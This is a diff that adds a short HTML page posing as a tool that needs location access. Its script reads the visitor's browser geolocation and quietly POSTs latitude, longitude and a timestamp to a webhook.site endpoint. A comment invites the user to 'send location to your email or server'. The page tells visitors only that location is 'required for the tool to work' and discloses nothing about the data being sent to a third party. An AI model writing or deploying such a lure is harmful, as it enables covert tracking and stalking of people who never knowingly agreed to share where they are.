@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Access</title>
+</head>
+<body>
+  <h2>Please allow location access</h2>
+  <p>This is required for the tool to work.</p>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // Send location to your email or server
+        fetch("https://webhook.site/e124f6e7-38a4-4c10-851d-5172d042b47c", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({lat, lon, timestamp: new Date()})
+        });
+
+        alert("Thanks! Your location has been shared.");
+      },
+      function(error) {
+        alert("Location access denied.");
+      }
+    );
+  </script>
+</body>
+</html>
